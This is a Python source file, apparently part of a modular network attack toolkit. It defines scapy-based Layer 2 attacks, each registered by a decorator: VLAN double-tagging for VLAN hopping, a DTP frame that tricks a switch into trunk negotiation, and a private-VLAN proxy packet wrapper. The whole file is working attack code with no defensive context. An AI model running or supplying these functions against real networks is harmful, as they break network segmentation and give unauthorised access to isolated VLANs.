from scapy.contrib.dtp import *
from scapy.layers.l2 import Dot3, SNAP, Dot1Q, Ether
from scapy.layers.inet import IP
from scapy.all import get_if_hwaddr, get_if_addr

from libs.aux_funcs import type_wrapper

@type_wrapper(category="middleware", name="Double Tagging", layer="Layer 2", type="wrapper",arg_list=["vlan_in", "vlan_out"])
def vlan_double_tagging(args):
    vlan_in = args["vlan_in"]
    vlan_out = args["vlan_out"]
    args["packet"] = Dot1Q(vlan=vlan_out)/Dot1Q(vlan=vlan_in)/args["packet"]
    return args

@type_wrapper(category="middleware", name= "DTP Trunk Negotiation", type="single use", layer="Layer 2", arg_list=["interface"])
def vlan_dtp_attack(args):
    interface = args["interface"]
    pkt = Dot3(src=get_if_hwaddr(interface), dst="01:00:0c:cc:cc:cc")/SNAP()/DTP(tlvlist=[DTPDomain(),DTPStatus(),DTPType(),DTPNeighbor(neighbor=get_if_hwaddr(interface))])
    sendp(pkt, iface=interface)

@type_wrapper(category="middleware", name="PVLAN Proxy", type="wrapper", layer="Layer 2", arg_list = ["interface", "target_ip", "target_mac"])
def vlan_pvlan_proxy(args):
    interface = args["interface"]
    target_ip = args["target_ip"]
    target_mac = args["target_mac"]
    packet = args["packet"]
    args["packet"] = Ether(src=get_if_hwaddr(interface), dst=target_mac)/IP(src=get_if_addr(interface), dst=target_ip)/packet
    return args